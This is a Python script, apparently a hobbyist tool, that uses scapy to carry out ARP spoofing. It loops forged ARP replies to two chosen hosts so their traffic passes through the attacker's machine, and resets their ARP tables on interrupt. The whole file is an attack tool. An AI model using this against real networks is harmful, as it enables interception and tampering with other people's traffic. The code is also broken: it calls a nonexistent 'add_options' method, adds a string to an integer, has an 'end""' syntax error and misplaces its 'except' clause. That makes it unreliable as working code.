import scapy.all as scapy
import time
import optparse

def iptomac(ip):
	arp_request=scapy.ARP(pdst=ip)
	broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	combine=broadcast/arp_request
	answelist=scapy.srp(combine,timeout=1,verbose=False)[0]
	return answelist[0][1].hwsrc

def poison(targetip,poisonip):
	targetmac=iptomac(targetip)
	arp_response=scapy.ARP(op=2,hwdst=targetmac,psrc=poisonip)
	scapy.send(arp_response,verbose=False)

def reset(targetip,poisonip):
	targetmac=iptomac(targetip)
	poisonmac=iptomac(poisonip)
	arp_response=scapy.ARP(op=2,hwdst=targetmac,psrc=poisonip,hwsrc=poisonmac)
	scapy.send(arp_response,verbose=False,count=6)

def user():
	parse_obj=optparse.OptionParser()
	parse_obj.add_options("-t","--target",dest="targetip",help="Enter Target ip")
	parse_obj.add_options("-p","--poison",dest="poisonip",help="Enter Poison ip")
	options=parse_obj.parse_args()[0]
	if not options.targetip:
		print("Enter Target ip")
	if not options.poisonip:
		print("Enter Poison ip")
	return options


number=0
user_ips=user()
user_target_ip=user_ips.targetip
user_poison_ip=user_ips.poisonip

try:
	while True:

		poison(user_target_ip,user_poison_ip)
		poison(user_poison_ip,user_target_ip)
		number+=2
		print("\nSending " +number,end"")
		time.sleep(3)
	except KeyboardInterrupt:
		print("\n Quit & Reset")
		reset(user_target_ip,user_poison_ip)
		reset(user_poison_ip,user_target_ip)


